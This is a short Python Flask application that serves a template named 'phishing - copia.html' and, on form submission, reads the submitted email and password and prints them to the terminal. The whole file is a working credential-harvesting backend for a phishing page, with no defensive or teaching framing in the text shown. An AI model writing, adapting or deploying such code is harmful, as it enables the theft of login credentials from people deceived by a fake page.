from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('phishing - copia.html')


@app.route('/submit', methods=['POST'])
def submit():
    # Get the values of the input fields from the request object
    email = request.form['email']
    password = request.form['password']

    # Print the input data to the terminal
    print(f'Email: {email}\nPass: {password}')

    return 'Form submitted successfully!'


if __name__ == '__main__':
    app.run()
